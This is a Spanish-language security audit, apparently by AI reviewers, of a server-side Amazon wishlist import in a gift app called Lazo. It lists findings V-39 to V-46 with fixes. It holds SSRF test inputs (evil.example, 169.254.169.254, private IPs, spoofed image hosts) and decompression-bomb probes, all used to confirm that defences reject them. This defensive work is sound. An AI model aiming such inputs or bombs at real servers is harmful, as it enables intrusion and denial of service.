| Bajo | 5 (V-41 a V-45) |

### Enmiendas al diseño AMZ que quedan registradas

| Requisito | Decía | Queda | Valoración |
|---|---|---|---|
| AMZ-6 | 5 páginas y 100 productos | **10 páginas y 200 productos** (`AMZ_SERVIDOR`); pausa de 1 a 2 s | Decisión del dueño. El camino (b) sigue en 100. Probado: 7 peticiones para 200 y 10 peticiones como mucho |
| AMZ-7 tiempo | 25 s en total; `$http.send` 30 s | **60 s** en total (un único plazo que incluye las pausas), 6 s por página; `$http.send` 75 s; `requestTimeout` del servicio 90 s | Coherente con 10 páginas. PocketBase sigue esperando más que el servicio |
| AMZ-7 tamaño | 3 MB por página y 10 MB en total | 3 MB por página; **sin tope total** (30 MB como mucho, una página cada vez, nunca acumuladas) | Aceptable: en memoria hay una sola página |
| AMZ-7 compresión | Sin `Accept-Encoding`: no hay descompresión | Se sigue sin pedir compresión, pero Amazon comprime igual: **se descomprime en flujo** (`gzip`, `deflate`, `br`) y el tope cuenta los bytes ya descomprimidos | Correcto y medido (abajo). Vale también para `/unfurl` |
| AMZ-4 | Una sola petición a `amzn.eu`, sin seguir el `Location` | Hasta **4 saltos, solo dentro de `amzn.eu`** (host exacto, `https`, sin puerto), leyendo 1 byte de cuerpo como mucho; el primer `Location` que sea una lista de amazon.es se convierte en identificador y no se visita | Aceptable: no sale de `amzn.eu` |
| AMZ-12 | 3 cada 10 min y 10 al día por persona; 30 páginas por hora en todo el servidor | **5 lecturas por persona y hora**, en memoria (`$app.store()`, se pierde al reiniciar); 20 por hora e IP como red; una lectura a la vez en todo el servidor | El tope de páginas por hora no existe (V-42) y el enlace corto queda fuera (V-40) |
| AMZ-13 demo | En la demo no existe el camino (a) | La demo **lo simula** con `DEMO_AMAZON_HTML`: `capacidades` dice `true` y no sale ninguna petición (e2e: cero peticiones a otro origen) | Se cumple el fondo (la demo no toca Amazon). `AMAZON.md` aún dice «nunca en la demo pública» (V-45) |
| AMZ-13 respuesta | `{ title, image, priceCents, asin }` | Además `url` (siempre `/dp/<ASIN>`), `priority` y `quantity` (enmienda de la v1.1) y `partial` | Sin objeción |
| AMZ-16 | Ninguna foto antes de confirmar | Sigue así con lo pegado. Si la lista la leyó el servidor, la vista previa **carga ya las fotos** (solo los tres hosts de Amazon, `no-referrer`) | Aceptable: Amazon ya ha recibido la visita del servidor. Documentado en `AMAZON.md` |

### Estado de cada requisito

| Requisito | Estado | Comprobación |
|---|---|---|
| AMZ-1 apagada por defecto | Cumplido | Solo vale el valor exacto `on`. Apagada: 404 con y sin sesión en `amazon-lista` y `amazon-corto` (probado), y `index.mjs` no atiende `/wishlist` ni `/amzn` (leído; sin prueba, V-44). Los dos `.env.example` la llevan comentada y `docker-compose.yml` la pasa vacía. Sin `cronAdd` ni reintentos |
| AMZ-2 solo el identificador | Cumplido | PocketBase y el servicio validan `^[A-Z0-9]{10,16}$` cada uno por su lado; una URL, minúsculas, `../x` o 17 caracteres dan `NO_ES_LISTA` sin llegar al servicio (probado). La URL la construye `listaUrl` |
| AMZ-3 lista blanca en cada salto | Cumplido | `permitida`: `https:`, `hostname === 'www.amazon.es'`, sin puerto ni credenciales, ruta `/hz/wishlist/`. `new URL` normaliza `..` y `%2e%2e` antes de comparar. Dos redirecciones como mucho. `evil.example`, `amazon.es` sin `www`, `http:`, `:8443`, `/gp/redirect.html` y `169.254.169.254` dan `error` con una sola petición (probado) |
| AMZ-4 enlace corto | Cumplido con enmienda | Código `^[A-Za-z0-9]{4,20}$` validado dos veces; ver tabla de enmiendas. Fuera del cortacircuitos y del límite por persona: V-40 |
| AMZ-5 guarda de IP y DNS | Cumplido | `wishlist.mjs` llama a `once()` sin `lookup` ni `allowPrivate`, así que se usa `safeLookup` y la conexión va a la IP validada. `guard.mjs` no cambia. Sin prueba propia en este camino (V-44) |
| AMZ-6 paginación | Cumplido con enmienda | El testigo de `showMoreUrl` solo vale si el enlace es de `www.amazon.es/hz/wishlist/`, lleva `lid` igual al identificador pedido y casa `^[A-Za-z0-9_=%-]{1,3000}$`. **De la página solo sale el valor del testigo**: la URL la arma `paginaUrl` con `URLSearchParams`, de modo que no se puede construir una URL arbitraria. Testigo repetido, de otra lista o página sin nada nuevo: fin. Sin cookies |
| AMZ-7 tamaño y tiempo | Cumplido con enmiendas; un pendiente | Ver sonda. Pendiente: límites del contenedor (V-43) |
| AMZ-8 captcha | Cumplido en la lista | 429, 503, redirección a `validateCaptcha` y el HTML del captcha dan `AMAZON_BLOQUEA` tras **una** petición, y la siguiente llamada no abre conexión durante una hora (probado, también en la segunda página). `User-Agent` `LazoBot`, sin cabeceras de navegador ni `Cookie` (prueba de texto). El enlace corto no entra: V-40 |
| AMZ-9 títulos | Cumplido | `decode` una vez y `limpiaTitulo` (los mismos del camino b). La fixture hostil deja `&lt;b&gt;` literal. La vista previa pinta nodos de texto |
| AMZ-10 enlaces, fotos, precios | Cumplido | ASIN `[A-Z0-9]{10}` y enlace construido; ningún `href` se copia. Foto por `fotoSegura` (tres hosts, `https`, sin puerto ni credenciales): `m.media-amazon.com.evil.example`, `evil.example` y `http:` salen sin foto. Precio finito y mayor que cero (`-Infinity` descartado). «Tiene» no se lee (prueba) |
| AMZ-11 LA REGLA | Cumplido | Las rutas solo consultan `groups` por pertenencia. No reciben id de lista ni de grupo de Lazo. Misma respuesta para Ana y para Bea (probado). El «ya lo tienes» sigue siendo de `esDuplicado` en el cliente sobre `listDetail`, que en la plaza propia no trae sorpresas ni retirados. El alta va por `importItems`, sin cambios |
| AMZ-12 límites | **Parcial** | 5 por persona y hora (probado: la sexta da 429 sin llegar al servicio y otra persona sigue pudiendo); el identificador inválido no gasta cupo; `busy` y el cortacircuitos sí. Faltan V-40 y V-42 |
| AMZ-13 proxy y errores | Cumplido | Conjunto cerrado `{code, message}`; `blocked`, `network`, `http_*` y `timeout` llegan como el mismo `ERROR` (probado: sin `<` ni `http` en el cuerpo). Sin productos, `VACIA`. Sin caché. `unfurl` sigue sin puertos y exige `x-lazo-key` en las tres rutas. `Caddyfile` e `index.html` no cambian |
| AMZ-14 identificador | Cumplido por lectura | Viaja en el cuerpo del `POST` en los dos tramos (probado en el segundo); no se escribe en ninguna colección; `unfurl` no registra nada; el cliente lo tiene solo en el estado de la hoja. No he hecho la búsqueda del centinela en `data.db` y `auxiliary.db` (V-44) |
| AMZ-15 analizador | Cumplido | Ventanas de 3 000 caracteres y cuantificadores acotados. Sonda con 3 MB: el peor caso, `data-itemid` repetido sin `<li`, 305 ms; el resto, menos de 220 ms |
| AMZ-16 camino (b) | Cumplido con enmienda | Lo pegado sigue sin fotos antes de confirmar (e2e) |

### Lo que he comprobado y está bien

- **SSRF.** Al servicio solo llegan un identificador o un código, nunca una URL. Los únicos hosts a los que conecta este camino son `www.amazon.es` (ruta `/hz/wishlist/`) y `amzn.eu`, por comparación exacta, en la primera petición y en cada salto. Debajo sigue `safeLookup`: si el DNS de casa resuelve cualquiera de los dos a una IP privada, se rechaza. `allowPrivate` sigue sin ser alcanzable por HTTP.
- **Descompresión** (sonda contra `once()` con un servidor local, plazo de 2 s):

  | Caso | Resultado | Tiempo | Memoria de más |
  |---|---|---|---|
  | gzip de 1 MB que se expande a 1 GB, tope 3 MB | 3 000 000 bytes, `truncated` | 26 ms | inapreciable |
  | El mismo, tope 1 byte (enlace corto) | 1 byte, `truncated` | 4 ms | 0,2 MB |
  | Brotli que se expande a 256 MB | 3 000 000 bytes, `truncated` | 21 ms | 6 MB |
  | Miembros gzip vacíos sin fin (entra mucho, no sale nada) | `timeout` al cumplirse el plazo | 2 001 ms | 42 MB (incluye al servidor de la sonda) |
  | gzip que se queda a medias y calla | `timeout` | 2 001 ms | 0 |
  | gzip cortado | `network` | 3 ms | 0 |
  | `Content-Encoding: gzip, gzip` o desconocido | `not_html`, sin leer | 3 ms | 0 |

  El tope cuenta bytes descomprimidos y la memoria no pasa del tope más un bloque de zlib. Lo único que no se cuenta son los bytes comprimidos que no producen salida, y eso lo acota el plazo (V-43).
- **Autorización.** `capacidades`: sesión de `users` (401 sin ella); devuelve un único booleano. `amazon-lista` y `amazon-corto`: apagada, 404 antes de mirar la sesión; encendida, 401 sin sesión o con sesión de superusuario (esto último por lectura) y 403 sin grupo. La validación del identificador va antes del cupo.
- **Errores.** Ningún mensaje lleva HTML, URL, estado HTTP de Amazon ni texto de excepción. `OCUPADO` y `AMAZON_BLOQUEA` dicen a un miembro que otra persona está leyendo una lista o que hubo un bloqueo en la última hora: es actividad del servidor, no estado de ninguna lista.
- **Demo y vista previa.** La demo devuelve siempre la misma lista inventada, sin mirar el estado de nadie, y marca los duplicados contra lo que la dueña ve. En la vista previa del servidor el único origen nuevo son las fotos de los tres hosts de Amazon; la CSP no cambia.
- **Fixtures de `test/fixtures/amazon-lista-servidor/`.** Derivadas del HTML real de Amazon pero **sin datos reales**: el identificador es `LAZOTEST00001` (y `OTRALISTA0001`), los ASIN `B0LAZOSV01` a `53`, los `itemId` `ILAZOFICT00xx`, la sesión `000-0000000-0000000`, los testigos `ESHV2_LAZOFICTICIO…`, las fotos `…/images/I/lazo-ficticia-N._SS135_.jpg`, los títulos son genéricos, el autor «Autora Ficticia, Editorial Inventada S.L.» y el título de la página «Lista de ejemplo». No aparece ningún nombre de persona. Lo único auténtico son constantes públicas de Amazon (el identificador del mercado de amazon.es y la imagen de relleno). El directorio solo existe en `bfb1c1b`: no hay versión anterior en el historial con otros datos. En todo el diff los únicos identificadores son esos, `LAZODEMO2026X` y los códigos cortos de prueba. No conozco el identificador real de la lista del dueño, así que lo que afirmo es que nada de lo que hay tiene aspecto real, no que lo haya comparado con él.

### V-39 · Medio · La lectura trae solo «No comprados»: lo que falta delata lo que ya le han comprado en Amazon

`listaUrl` y `paginaUrl` piden `filter=unpurchased`, y el servidor lee la lista como invitado, que es la vista que sí sabe qué se ha comprado (las fixtures llevan «Tiene:» e «Inicia sesión para reservar este artículo»). El campo «Tiene» no se lee, pero el filtro hace lo mismo por omisión: un producto que alguien ya compró desde la lista no llega a la vista previa. El mensaje de `VACIA` lo dice con todas las letras: «No encuentro productos **sin comprar** en esa lista».

*Escenario.* Marta tiene 12 productos en su lista de Amazon. Su tía compra los auriculares desde la lista; Amazon se lo oculta a Marta, que tiene activado no desvelar sorpresas. Marta pega el enlace en Lazo: «He encontrado 11 productos». Faltan los auriculares: ya sabe qué le han comprado. Si lo repite cada semana, ve desaparecer uno a uno los regalos.

*Por qué es medio y no alto.* No es estado de Lazo: ninguna reserva ni compra hecha en Lazo se deduce de aquí, y Marta puede ver lo mismo abriendo su enlace «Solo ver» en una ventana privada. Pero la condición de la enmienda de la v1.1 era justo esta («ese recuento es estado; traerlo a Lazo sería una fuga por otra puerta»), el camino (b) no la tiene (pega lo que Amazon le enseña a ella) y aquí pasa sin que ella lo busque.

*Arreglo.* Que el resultado no dependa de las compras: `filter=all` en `listaUrl` y en `paginaUrl` (`src/core/amazonServidor.ts`), y el mensaje de `VACIA` pasa a «No encuentro productos en esa lista.» (`lib/amazon.cjs`). Corregir «No comprados» en `AMAZON.md`, `HOMELAB.md` y el `CHANGELOG`. **A confirmar con una lista real** que `filter=all` enseña a un invitado también lo comprado; no lo he probado contra Amazon. Si el dueño prefiere mantener el filtro (para que la familia no compre dos veces), que sea una decisión declarada: un riesgo residual en `SECURITY.md` y un aviso en la hoja antes de leer («si falta algo, es que ya te lo han comprado en Amazon»).

*Prueba.* En `amazonServidor.test.ts` y `wishlist.test.mjs`: las dos URL construidas llevan `filter=all`; una fixture con una ficha comprada da esa ficha con los mismos campos que las demás; ningún mensaje de `MSG` contiene «comprar» ni «comprado».

### V-40 · Medio · El enlace corto queda fuera del cortacircuitos y del límite por persona

`resuelveCorto` no mira `state.bloqueadoHasta`, no lo fija cuando `amzn.eu` responde 429 o 503 (devuelve `AMAZON_BLOQUEA` y nada más) y no pasa por la lectura única. `amazon-corto` no llama a `A.allow`. Su único freno es la regla de PocketBase, 10 por minuto e IP: 600 por hora, con hasta 4 saltos cada una, y en paralelo.

*Escenario.* Un sobrino con sesión llama a `amazon-corto` en bucle con `curl`. Salen hasta 2 400 peticiones por hora a `amzn.eu` desde la IP de casa. Amazon empieza a contestar 503: el servidor responde «Amazon no deja leer la lista ahora mismo» y **sigue llamando** en la petición siguiente. El cortacircuitos, que existe para proteger esa IP, no se entera. Al revés también: con el cortacircuitos ya saltado por una lista, cada enlace corto pegado sigue saliendo a Amazon durante esa hora.

*Arreglo.* En `server/unfurl/wishlist.mjs`, dentro de `resuelveCorto`:

```js
const now = opts.now ?? Date.now;
if (now() < state.bloqueadoHasta) throw fallo(BLOQUEA); // antes de la primera petición
// …y en el catch:
if (e?.code === 'http_503' || e?.code === 'http_429') {
  state.bloqueadoHasta = now() + AMZ.bloqueoMs;
  throw fallo(BLOQUEA);
}
```

En `lib/amazon.cjs`, `allow(app, userId, kind = 'amz', max = PER_HOUR)` con la clave `` `${kind}:${userId}` ``, y en `amazon-corto`, tras validar el código: `if (!A.allow($app, e.auth.id, 'corto', 30)) return A.fail(e, 'LIMITE');`. Treinta y no cinco porque cada enlace corto de un producto suelto pasa por aquí antes de ir a `unfurl`.

*Prueba.* `wishlist.test.mjs`: tras un captcha en `leeLista`, `resuelveCorto` da `AMAZON_BLOQUEA` con cero peticiones; un 503 en `resuelveCorto` deja a `leeLista` sin tocar la red durante una hora. `amazon.test.mjs`: la llamada 31 de una persona a `amazon-corto` da 429 `LIMITE` y el simulador cuenta 30; otra persona sigue pudiendo.

### V-41 · Bajo · Un enlace de lista que llega de otra app lanza la lectura sin que nadie pulse

Con «Compartir → Lazo», `AddGift` abre `AmazonLista` con el texto recibido y `analiza` llama a `conEnlace` en cuanto ve un enlace de lista: el servidor sale a Amazon sin ningún toque. Es V11-2 con más alcance, porque antes el texto ajeno solo se analizaba en el móvil. Deducido del código; no probado en un Android.

*Escenario.* Una app instalada manda a Lazo cinco `ACTION_SEND` con el enlace de una lista pública cualquiera. La persona tiene sesión en un servidor con la lectura encendida: su servidor hace hasta 50 peticiones a Amazon, ella se queda sin cupo durante una hora y ve la vista previa de una lista ajena (con el aviso «Texto recibido de otra app»). Nada se añade sin pulsar.

*Arreglo.* En `AmazonLista.tsx`, si `deOtraApp` y lo recibido es solo un enlace, no leer: enseñar «Has compartido el enlace de una lista de Amazon» con un botón «Leer la lista», que es quien llama a `conEnlace`.

*Prueba.* e2e con `guardaCompartido(enlace)`: no hay llamada a `amazonLista` (espía en `__lazoDemo` o en la red) hasta pulsar el botón.

### V-42 · Bajo · No hay tope global por hora, el cupo no es atómico y un 403 no cuenta como bloqueo

Tres restos de AMZ-12 y AMZ-8, los tres acotados por la lectura única:

1. El tope de páginas por hora «contado en `unfurl`» no existe. Hoy el límite real es 5 lecturas × 10 páginas por persona, y 20 lecturas por hora e IP; con cada móvil saliendo por su red de datos, una familia de diez puede llegar a 500 páginas por hora.
2. `allow` lee y escribe `$app.store()` en dos pasos: dos peticiones simultáneas de la misma persona pueden pasar las dos con el cupo en 4. La segunda recibe `OCUPADO`, así que no llega a Amazon. Por lectura; no lo he reproducido.
3. Solo 429, 503 y el captcha saltan el cortacircuitos. Un 403 (lo que suele contestar un antirrobots) llega como `ERROR` con el botón «Reintentar».

*Arreglo.* (1) En `wishlist.mjs`, `state.paginas = []` con la hora de cada petición; antes de cada página se purgan las de hace más de una hora y, si hay 100 o más (diez lecturas completas), `rate_limited` en la primera página o `partial` en las siguientes; `rate_limited: 'LIMITE'` en `CODES`. (2) Aceptarlo y dejarlo escrito en el comentario de `allow`. (3) Añadir `http_403` a la condición que lanza `BLOQUEA` en `pagina`; una lista que no existe da 404 y no se confunde.

*Prueba.* `wishlist.test.mjs` con `now` inyectado: la página 101 de la hora no abre conexión; un `http_403` deja el cortacircuitos puesto.

### V-43 · Bajo · `unfurl` sigue sin límites de contenedor, y el tope no cuenta los bytes comprimidos

AMZ-7 decía que `mem_limit` y `pids_limit` dejaban de ser opcionales con la importación; `docker-compose.yml` no los lleva. Además, un flujo gzip hecho de miembros vacíos entra sin producir salida: el tope de 3 MB nunca salta y solo lo corta el plazo. En la sonda, 332 MB recibidos en 2 s por loopback sin retener memoria; por Internet y con 6 s serán decenas de megas. Solo puede servirlo Amazon (o cualquier página, en `/unfurl`): es consumo de ancho de banda y de CPU durante unos segundos, no una caída.

*Arreglo.* En el servicio `unfurl` de `server/docker-compose.yml`: `mem_limit: 256m` y `pids_limit: 64`. En `once()` (`fetch.mjs`), cuando hay descompresión, contar también lo recibido y cortar igual que con lo descomprimido:

```js
let crudo = 0;
if (unzip) res.on('data', (c) => { if ((crudo += c.length) > max) { res.destroy(); body.destroy(); resolve({ body: Buffer.concat(chunks).toString('utf8'), truncated: true }); } });
```

*Prueba.* En `wishlist.test.mjs`, junto a la de compresión: un servidor que emite miembros gzip vacíos sin parar termina en `truncated` con menos de 3,2 MB recibidos, sin esperar al plazo.

### V-44 · Bajo · Faltan las pruebas que fijan lo que hoy está bien

`wishlist.test.mjs` inyecta `get`, así que el cableado real (`once` con `safeLookup`) no se ejercita en este camino, y varias pruebas descritas en el diseño no están:

1. AMZ-5: `leeLista` y `resuelveCorto` con el `once` real y un `lookup` falso que devuelve `127.0.0.1`, `169.254.169.254`, `::ffff:10.0.0.1` y una pública más una privada: `error` (o `not_a_list`) sin abrir socket.
2. AMZ-1 en el servicio: sin `AMAZON_IMPORT`, `POST /wishlist` y `POST /amzn` dan 404 también con la clave buena. Hoy `index.mjs` arranca al importarlo y no se puede probar: hace falta exportar el manejador.
3. AMZ-14: tras una lectura con un identificador centinela, cero coincidencias en `data.db` y `auxiliary.db` del PocketBase de pruebas.
4. AMZ-13: el cuerpo de un 200 casa un esquema estricto (solo `productos` y `partial`; en cada producto solo los siete campos).
5. AMZ-7: goteo lento con el `once` real acaba en `timeout` dentro del plazo total, y PocketBase devuelve el error del servicio y no un 500 propio.
6. Vista previa del servidor en la app: con una respuesta hostil simulada, toda foto pintada es de los tres hosts y todo enlace guardado casa `/dp/<ASIN>` (repasar `r.productos` con `fotoSegura` y `conAsin` en `AmazonLista.tsx` cuesta dos líneas y deja de fiarlo todo al servidor).

### V-45 · Bajo · `SECURITY.md` y `AMAZON.md` no cuentan lo nuevo

`SECURITY.md` no menciona la lectura de listas. La fila «SSRF» sigue diciendo «6 s de tiempo total y 1,5 MB», que ya solo vale para `/unfurl`. `AMAZON.md` conserva «nunca en la demo pública» mientras la demo la simula.

*Arreglo.* En «Otras medidas» de `SECURITY.md`, una fila «Lista de Amazon desde el servidor»: apagada por defecto; solo `www.amazon.es/hz/wishlist/` y `amzn.eu`; del cliente solo sale un identificador; 10 páginas, 200 productos, 3 MB por página ya descomprimidos y 60 s; 5 por persona y hora, una a la vez, una hora de silencio tras un captcha; sin cookies; no lee ni escribe ninguna lista de Lazo. Añadir `server/test/amazon.test.mjs` y `server/unfurl/test/wishlist.test.mjs` a la lista de pruebas. En `AMAZON.md`, aclarar que la demo la simula sin red. Y lo que salga de V-39.

### Observaciones sin número

- Cualquier miembro puede leer **cualquier** lista pública de Amazon con el servidor de la familia, no solo la suya: es lo que AMZ-13 ya aceptaba (solo listas, con cupo).
- Una lista cuyo HTML contenga `/errors/validateCaptcha` o la dirección de soporte de Amazon (por ejemplo, en un comentario) salta el cortacircuitos una hora. Falla hacia el lado seguro.
- Tras un bloqueo en la segunda página se descarta lo ya leído y se responde `AMAZON_BLOQUEA`. Correcto: no insistir pesa más que la lectura parcial.
- El cupo y el cortacircuitos viven en memoria: reiniciar PocketBase o `unfurl` los pone a cero. Aceptado en la decisión.

### Secretos

- **Repositorio.** En el diff no hay claves, tokens, rutas locales ni direcciones reales: solo IP de documentación en las pruebas y la clave de usar y tirar del `unfurl` simulado. `AMAZON_IMPORT` no es un secreto y va comentada en los dos `.env.example`, que son los únicos `.env*` en el índice. `server/unfurl/amazon.mjs` (generado) está ignorado. `gitleaks` no está instalado aquí: búsqueda por patrones.
- **Builds.** El diff no añade ninguna variable `VITE_` ni lectura de `import.meta.env`. `.env.local` tiene dos variables, ninguna con prefijo `VITE_` (he mirado nombres, no valores). En `dist/`, `dist-demo/` y `android/app/src/main/assets/public/` de esta copia, cero cadenas con forma de clave; son builds que ya estaban ahí, no los he regenerado con este código. `DEMO_AMAZON_BLOQUEA` y la lista de la demo entran en todos los builds: son datos inventados.
- **Sigue igual.** Los commits llevan el correo de un dominio corporativo (observación de la v1.1.2).

### Veredicto

**Apto** para publicar. No hay hallazgos críticos ni altos; la función va apagada en el repositorio, en la demo no sale a ningún sitio y el APK no cambia de superficie. Con ella encendida, el servidor solo conecta con `www.amazon.es/hz/wishlist/` y con `amzn.eu`, no hay bomba de descompresión, los errores no filtran nada y ninguna ruta nueva lee una lista de Lazo. Las fixtures no llevan datos reales y no hay secretos en el repositorio ni en los builds.

Condiciones:

1. **V-39 y V-40 antes de poner `AMAZON_IMPORT=on` en un servidor con familia dentro**, y mejor en esta misma versión: son unas quince líneas. V-39 admite la alternativa de aceptarlo por escrito; lo que no debería pasar es que se quede como está sin que nadie lo haya decidido.
2. Los cambios sin confirmar de la 1.2.0 (`CHANGELOG`, versiones) no están auditados; el `CHANGELOG` repite «No comprados» y habrá que ajustarlo según V-39.
3. Los bajos pueden ir en la siguiente.

### Estado tras la auditoría v1.2.0 (Opus 5.5)

- **V-39:** aceptado por decisión del dueño del proyecto (pidió expresamente el filtro «No comprados»). Recogido en `SECURITY.md`; el mensaje `VACIA` ya es neutro («No encuentro productos en esa lista.»).
- **V-40:** corregido. `resuelveCorto` consulta y fija el cortacircuitos; `amazon-corto` pasa por `allow(app, userId, 'corto', 30)`.
- **V-43:** en parte: `mem_limit: 256m` y `pids_limit: 64` en `unfurl`. El contador de bytes crudos queda para la v1.2.1.
- **V-45:** corregido (`SECURITY.md` y `AMAZON.md`).
- **V-41, V-42, V-44:** pendientes para la v1.2.1.

### Estado en la v1.2.1

- **V-41:** corregido. Lo que llega de otra app (también un `amzn.eu/d/…`, que se resuelve pero no se lee) enseña «Has compartido el enlace de una lista de Amazon» y solo «Leer la lista» llama a `conEnlace`. Lo pegado a mano se lee como antes (e2e con espía en `__lazoDemo`).
- **V-42:** corregido. Tope global de 60 peticiones de lista por hora en `state.paginas` (`rate_limited` → `LIMITE`; en una página posterior, `partial`). `http_403` salta el cortacircuitos en la lista y en el enlace corto. La falta de atomicidad de `allow` queda aceptada y escrita en su comentario. El mensaje de `LIMITE` pasa a ser neutro, porque ahora también lo da el tope del servidor.
- **V-43:** corregido. `once()` cuenta también los bytes crudos cuando descomprime, con el mismo tope.
- **V-44:** las seis pruebas: guarda de IP con el `once` real (`opts.dns` va debajo de `safeLookup`), 404 del servicio apagado (`index.mjs` exporta `servidor()` y solo arranca con `import.meta.main`), centinela en `data.db` y `auxiliary.db`, esquema estricto, goteo lento (y el `timeout` del servicio llega como `ERROR`, no como un 500) y saneado en el cliente (`saneaProducto`).
- **Nuevo:** con la importación apagada (o si `capacidades` falla), el enlace de una lista enseña cómo encenderla (`AMAZON_IMPORT=on` en `server/.env` y `docker compose up -d --build`) y el enlace a los riesgos; el modo manual sigue debajo.

---

## Auditoría v1.2.1 (Fable 5.2)

Fecha: 2026-11-13 · Sobre `main` en `82facb5`. Diff revisado: `1fc6149..HEAD` (13 archivos) más el cambio sin confirmar de `server/unfurl/index.mjs` (el arranque deja de depender de `import.meta.main`).

**Método.** Lectura del diff y de los archivos que toca. Ejecutado: `node --test server/unfurl/test/*.test.mjs` con la copia de trabajo (**26 de 26**, Node 24.19 en Windows); una sonda contra `servidor()` (clave vacía, cuerpos con `dns`, `lookup` y `allowPrivate`, variantes de ruta con la función apagada); el arranque real de `node index.mjs` con y sin clave; una sonda de `saneaProducto` y de la clasificación de lo compartido; y una mutación de `fetch.mjs` **en una copia fuera del repo**. **No ejecutado:** las pruebas contra PocketBase, `vitest`, Playwright, `gitleaks` (no está instalado aquí; queda el de CI), Docker ni ninguna petición a Amazon. El enlace a los riesgos lo he comprobado contra el árbol y el remoto, no por HTTP. No se ha tocado código ni se ha leído ningún valor de `.env*`.

**Efecto de una sonda mía.** La mutación (poner `opts.dns` en lugar de `safeLookup`) hizo que la prueba de AMZ-5 intentara conectar desde esta máquina al puerto 443 de `127.0.0.1`, `169.254.169.254` y `10.0.0.1`. No llegó a la IP pública del cuarto caso. No hay nada que deshacer.

**Nota.** Durante la revisión aparecieron en la copia de trabajo cambios sin confirmar que no son míos (`CHANGELOG.md`, `package.json`, `package-lock.json`, `android/app/build.gradle`: la subida a 1.2.1). Los he leído; no cambian nada de seguridad.

### Resumen

Ningún hallazgo crítico, alto ni medio. **LA REGLA no se toca:** el diff no añade ninguna lectura de `items`, `claims` ni de ninguna colección, y el aviso nuevo no depende del estado de ninguna lista. V-42, V-43 y V-44 quedan cerrados. **V-41 queda cerrado para el enlace solo y abierto por un camino lateral (V-46).** Seis hallazgos bajos.

| Gravedad | Hallazgos |
|---|---|
| Crítico | 0 |
| Alto | 0 |
| Medio | 0 |
| Bajo | 6 (V-46 a V-51) |

### Cierre de V-41 a V-44

| Hallazgo | Estado | Comprobación |
|---|---|---|
| V-41 | **Cerrado en parte** | El enlace solo de una lista, compartido desde otra app, llega a `leer(ref, false)` y se queda en «Leer la lista» sin llamar a `amazonLista` (leído; e2e con espía, no ejecutado). Falla el camino de `fromUrl`: V-46. El `amzn.eu/d/…` se resuelve sin toque, como dice la sección de estado: V-49 |
| V-42 | Cerrado | `cuentaPagina` va antes de cada petición, también de cada redirección; la que pasa de 60 no abre conexión (probado). En la primera página da `rate_limited` → `LIMITE`; después, `partial`. `http_403` salta el cortacircuitos en la lista y en el enlace corto (probado). La falta de atomicidad de `allow` está escrita en su comentario. El enlace corto no cuenta en el tope: V-49 |
| V-43 | Cerrado | `once()` cuenta lo recibido cuando descomprime y corta con el mismo tope (probado: miembros gzip vacíos acaban en `truncated` sin esperar al plazo). `mem_limit` y `pids_limit` siguen en `docker-compose.yml` |
| V-44 | Cerrado, con un matiz | Las seis pruebas existen. La de AMZ-5 no distingue bien lo que quiere fijar: V-50 |

### Respuesta a lo que se pidió mirar

- **Aviso con la importación apagada.**
  - *Fuga:* ninguna. Las tres cadenas (`AMAZON_IMPORT=on`, el comando y el enlace) son constantes del código, iguales en todos los servidores; no llevan host, ruta real, versión ni nada del `.env`. Lo único que el aviso revela es que la función está apagada, y eso ya lo da `capacidades` a cualquier sesión. No depende de la lista ni de quién mira.
  - *Enlace:* fijo (`RIESGOS`), `https://github.com/BertMarti/lazo/blob/main/docs/legal/AMAZON.md`. Coincide con el remoto `origin` y el archivo está en el índice. Lleva `target="_blank"` y `rel="noopener noreferrer"`. Apunta a `main`, no a una etiqueta: si el archivo se mueve, se rompe.
  - *Fallo de `capacidades`:* sí, cuenta como apagada, dos veces (`pocketbase.ts` y el `catch` de `conEnlace`). Es el lado seguro para Amazon (no sale ninguna petición), pero el texto afirma algo que puede ser falso: V-48.
  - *Portapapeles:* `navigator.clipboard.writeText` solo dentro de `copiar`, que solo se llama desde el `onClick` de «Copiar». El diff no añade ninguna lectura del portapapeles. Si falla, sale un aviso y el texto se puede seleccionar a mano.
  - *Demo:* `capacidades` de la demo da siempre `true`, así que el aviso no aparece en la demo pública.
- **`opts.dns`:** no se puede inyectar. `index.mjs` llama a `leeLista(body.id)`, `resuelveCorto(body.corto)` y `unfurl(body.url)` con un solo argumento; `opts` nunca sale del cuerpo. Sonda: un cuerpo con `dns`, `lookup` y `allowPrivate` hacia `http://127.0.0.1/` da `blocked`; `id` como array u objeto da `not_a_list`. Además `dns` va debajo de `safeLookup`: cambia quién resuelve, no quita `isBlockedIp`.
- **`servidor()` exportado:** el 404 se mantiene. Sonda con la clave buena y `amazon: false`: `POST /wishlist`, `/amzn`, `//wishlist`, `/wishlist?`, `GET /wishlist` y `PUT /amzn` dan 404. El 404 sigue yendo antes de mirar la clave. Un resto: V-47.
- **Arranque sin `import.meta.main` (sin confirmar):** correcto. `node index.mjs` arranca desde su carpeta y por ruta relativa desde otra; sin clave sale con 1; al importarlo en las pruebas no arranca. Falla hacia el lado seguro: si la comparación no casa (enlace simbólico, letra de unidad en otra caja), el proceso termina sin escuchar y sin mensaje. En el contenedor (`WORKDIR /app`, `node index.mjs`) casa.
- **`saneaProducto`:** cumple. El enlace se construye desde el ASIN, la foto pasa por `fotoSegura`, el título por `limpiaTitulo`, los números solo si son enteros en su rango, y los campos de más se descartan. Sonda: `javascript:`, `m.media-amazon.com@evil.example`, `1e99`, `'1'` y `1.5` salen fuera. Dos detalles en V-50.
- **Mensaje de `LIMITE`:** neutro y sin datos. Recibirlo en la primera lectura de la hora dice que otras personas han leído listas: es actividad del servidor, como `OCUPADO`, no estado de ninguna lista. Con el cupo de enlaces cortos el texto no es exacto («listas»), pero no filtra nada.

### V-46 · Bajo · V-41 se salta: un enlace de lista con texto alrededor, compartido desde otra app, se lee sin que nadie pulse

`AddGift.fromUrl` recibe `deOtraApp`, pero solo lo pasa en la rama del enlace corto. La rama del enlace de lista lo pierde:

```ts
if (id) return setStep({ kind: 'amazon', enlace: { id } });
```

A esa rama se llega con lo compartido cuando `comoLista` devuelve `null` y la primera URL es la de la lista: un texto con el enlace, más de 200 caracteres de relleno y **una sola** ficha reconocible. `AmazonLista` recibe `deOtraApp` sin definir, llama a `conEnlace(enlace, true)` y lee. Tampoco sale el aviso «Texto recibido de otra app».

*Escenario.* El de V-41, cambiando el texto: una app instalada manda `ACTION_SEND` con `https://www.amazon.es/hz/wishlist/ls/<ID>`, treinta palabras y «Taza bonita de regalo / 12,99 €». El servidor de la familia hace hasta 10 peticiones a Amazon por cada envío, la persona gasta su cupo de la hora y la app puede agotar el tope de 60 páginas de todo el servidor. Nada se añade sin pulsar.

